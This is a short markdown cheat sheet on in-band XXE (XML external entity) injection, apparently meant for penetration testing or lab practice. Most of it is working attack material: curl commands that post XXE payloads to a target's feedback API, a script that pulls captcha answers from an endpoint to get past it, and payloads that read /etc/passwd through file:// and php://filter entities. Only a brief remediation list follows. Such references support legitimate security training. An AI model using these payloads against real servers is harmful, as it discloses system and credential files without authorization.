# In-Band XXE

## Summary
Extract files via XXE with direct response output.

## Detection

### Step 1: Find XML Endpoints
```bash
# Check for XML processing endpoints
POST /api/feedback
Content-Type: application/xml
# Try Content-Type switch on any JSON endpoint
Content-Type: text/xml
Content-Type: application/xml
```

### Step 2: Handle Captcha/Prerequisites
```bash
# Some endpoints require captcha - fetch first
CAPTCHA=$(curl -s "https://target.com/rest/captcha" | python3 -c "
import json,sys; d=json.load(sys.stdin)
print(f'{d[\"captchaId\"]}:{d[\"answer\"]}')
")
CID=$(echo $CAPTCHA | cut -d: -f1)
ANS=$(echo $CAPTCHA | cut -d: -f2)

# Submit with captcha values
curl -X POST "https://target.com/api/Feedbacks" \
  -H "Content-Type: application/json" \
  -d "{\"comment\":\"test\",\"rating\":5,\"captchaId\":$CID,\"captcha\":\"$ANS\"}"
```

### Step 3: Test XXE (try multiple Content-Types)
```bash
# JSON endpoint with XML content type
curl -X POST "https://target.com/api/Feedbacks" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feedback>&xxe;</feedback>'

# XML-RPC style
curl -X POST "https://target.com/api" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>...'
```

## Payloads

### Basic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### PHP Base64 Encode (for binary files)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

### Error-Based XXE (when output is blocked)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<root>&xxe;</root>
```

## Remediation
- Disable external entity processing
- Use less complex data formats (JSON)
- Disable DOCTYPE in XML parser
